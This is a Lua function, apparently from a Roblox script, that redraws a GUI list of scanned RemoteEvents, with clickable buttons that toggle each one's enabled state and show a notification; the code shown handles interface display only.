function refreshRemoteList()
    for _, child in ipairs(remoteListFrame:GetChildren()) do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end
    
    if #remoteEvents == 0 then
        local empty = Instance.new("TextLabel")
        empty.Size = UDim2.new(1, 0, 0, 20)
        empty.BackgroundTransparency = 1
        empty.Text = "No RemoteEvents found. Press SCAN!"
        empty.TextColor3 = Colors.GrayDark
        empty.Font = Enum.Font.Gotham
        empty.TextSize = 9
        empty.Parent = remoteListFrame
        remoteListFrame.CanvasSize = UDim2.new(0, 0, 0, 25)
        return
    end
    
    for i, remote in ipairs(remoteEvents) do
        local item = Instance.new("TextButton")
        item.Size = UDim2.new(1, -10, 0, 18)
        item.BackgroundTransparency = 1
        item.Text = (remote.active and "🟢 " or "🔴 ") .. remote.name
        item.TextColor3 = remote.active and Colors.GreenBright or Colors.GrayDark
        item.Font = Enum.Font.Gotham
        item.TextSize = 9
        item.TextXAlignment = Enum.TextXAlignment.Left
        item.Parent = remoteListFrame
        
        item.MouseButton1Click:Connect(function()
            remote.active = not remote.active
            item.Text = (remote.active and "🟢 " or "🔴 ") .. remote.name
            item.TextColor3 = remote.active and Colors.GreenBright or Colors.GrayDark
            TweenService:Create(item, TweenInfo.new(0.1, Enum.EasingStyle.Quad), {TextColor3 = remote.active and Colors.GreenBright or Colors.GrayDark}):Play()
            showNotification("📡 REMOTE", remote.name .. " " .. (remote.active and "ENABLED" or "DISABLED"))
        end)
    end
    
    remoteListFrame.CanvasSize = UDim2.new(0, 0, 0, math.max(#remoteEvents * 20, 100))
end

